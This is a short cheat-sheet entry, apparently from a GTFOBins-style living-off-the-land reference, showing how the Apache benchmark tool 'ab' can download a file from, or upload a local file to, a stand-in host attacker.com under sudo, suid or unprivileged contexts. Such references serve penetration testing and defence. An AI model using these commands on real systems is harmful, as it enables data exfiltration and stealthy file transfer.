---
type: gtfobin
name: ab
platform: Unix
functions: [download, upload]
tags: [gtfobin, unix, lotl]
---

# ab

## download

```bash
ab -v2 http://attacker.com/path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
ab -p /path/to/input-file http://attacker.com/
```
**Contexts:** sudo, suid, unprivileged
